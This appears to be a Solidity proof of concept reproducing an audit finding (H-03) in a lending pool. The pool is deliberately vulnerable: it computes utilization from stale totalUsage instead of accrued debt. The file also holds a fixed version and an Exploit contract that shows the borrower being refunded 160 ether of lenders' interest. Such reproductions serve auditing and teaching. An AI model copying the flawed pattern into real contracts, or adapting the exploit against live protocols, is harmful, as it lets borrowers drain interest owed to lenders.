// SPDX-License-Identifier: MIT
pragma solidity ^0.8.24;

/*  Regnum Aurum — H-03 (Pashov, 2025-06-26)
    updateInterestRatesAndLiquidity refreshes totalLiquidity on a deposit
    but still reads reserve.totalUsage from the last debt action. Accrued
    debt is ignored, utilization is half of what it should be, and the
    borrower is refunded 160 ether of interest that lenders were owed.
*/

contract Asset {
    string public symbol = "raUSD";
    uint8 public constant decimals = 18;
    mapping(address => uint256) public balanceOf;
    mapping(address => mapping(address => uint256)) public allowance;

    function mint(address to, uint256 amount) external {
        balanceOf[to] += amount;
    }

    function approve(address spender, uint256 amount) external returns (bool) {
        allowance[msg.sender][spender] = amount;
        return true;
    }

    function transfer(address to, uint256 amount) external returns (bool) {
        balanceOf[msg.sender] -= amount;
        balanceOf[to] += amount;
        return true;
    }

    function transferFrom(address from, address to, uint256 amount) external returns (bool) {
        allowance[from][msg.sender] -= amount;
        balanceOf[from] -= amount;
        balanceOf[to] += amount;
        return true;
    }
}

contract Supplier {
    function deposit(address pool, uint256 amount) external {
        LendingPool(pool).deposit(amount);
    }

    function approve(Asset token, address spender) external {
        token.approve(spender, type(uint256).max);
    }
}

contract LendingPool {
    struct ReserveData {
        uint256 totalLiquidity;
        uint256 totalUsage;
        uint256 normalizedDebt;
    }

    Asset public asset;
    address public borrower;
    ReserveData public reserve;
    uint256 public escrow;
    uint256 public currentUsageRate;
    uint256 public interestCharged;

    constructor(Asset asset_, address borrower_) {
        asset = asset_;
        borrower = borrower_;
    }

    function seed(uint256 liquidity, uint256 usage, uint256 debt, uint256 escrow_) external {
        reserve.totalLiquidity = liquidity;
        reserve.totalUsage = usage;
        reserve.normalizedDebt = debt;
        escrow = escrow_;
    }

    function deposit(uint256 amount) external {
        require(asset.transferFrom(msg.sender, address(this), amount), "pull");
        updateInterestRatesAndLiquidity(amount, 0);
    }

    function updateInterestRatesAndLiquidity(uint256 liquidityAdded, uint256 liquidityTaken) internal {
        if (liquidityAdded > 0) {
            reserve.totalLiquidity += liquidityAdded;
        }
        if (liquidityTaken > 0) {
            reserve.totalLiquidity -= liquidityTaken;
        }
        uint256 totalDebt = reserve.totalUsage;
        // @> VULN: utilization is calculated from stale totalUsage, not the interest-accrued debt
        uint256 utilizationRate = calculateUtilizationRate(reserve.totalLiquidity, totalDebt);
        currentUsageRate = utilizationRate;
    }

    function calculateUtilizationRate(uint256 totalLiquidity, uint256 totalUsage) public pure returns (uint256) {
        if (totalLiquidity == 0) return 0;
        return totalUsage * 1e18 / totalLiquidity;
    }

    function settle() external returns (uint256 refund) {
        interestCharged = reserve.normalizedDebt * currentUsageRate / 1e18;
        refund = escrow - interestCharged;
        escrow = interestCharged;
        require(asset.transfer(borrower, refund), "refund");
    }
}

contract LendingPoolFixed {
    Asset public asset;
    address public borrower;
    uint256 public totalLiquidity;
    uint256 public normalizedDebt;
    uint256 public escrow;
    uint256 public currentUsageRate;

    constructor(Asset asset_, address borrower_) {
        asset = asset_;
        borrower = borrower_;
    }

    function seed(uint256 liquidity, uint256 debt, uint256 escrow_) external {
        totalLiquidity = liquidity;
        normalizedDebt = debt;
        escrow = escrow_;
    }

    function deposit(uint256 amount) external {
        require(asset.transferFrom(msg.sender, address(this), amount), "pull");
        totalLiquidity += amount;
        currentUsageRate = normalizedDebt * 1e18 / totalLiquidity;
    }

    function settle() external returns (uint256 refund) {
        uint256 interest = normalizedDebt * currentUsageRate / 1e18;
        refund = escrow - interest;
        require(refund == 0, "refund");
    }
}

contract Exploit {
    Asset public asset;
    LendingPool public pool;
    Supplier public supplier;
    uint256 public rate;
    uint256 public interest;
    uint256 public refunded;

    constructor() {
        asset = new Asset();
        pool = new LendingPool(asset, address(this));
        supplier = new Supplier();
        pool.seed(1000 ether, 400 ether, 800 ether, 320 ether);
        asset.mint(address(pool), 1000 ether + 320 ether);
        asset.mint(address(supplier), 1000 ether);
        supplier.approve(asset, address(pool));
    }

    function run() external {
        supplier.deposit(address(pool), 1000 ether);
        rate = pool.currentUsageRate();
        refunded = pool.settle();
        interest = pool.interestCharged();
        require(rate == 0.2 ether, "rate");
        require(interest == 160 ether, "interest");
        require(refunded == 160 ether, "refund");
        require(asset.balanceOf(address(this)) == 160 ether, "borrower");
    }
}
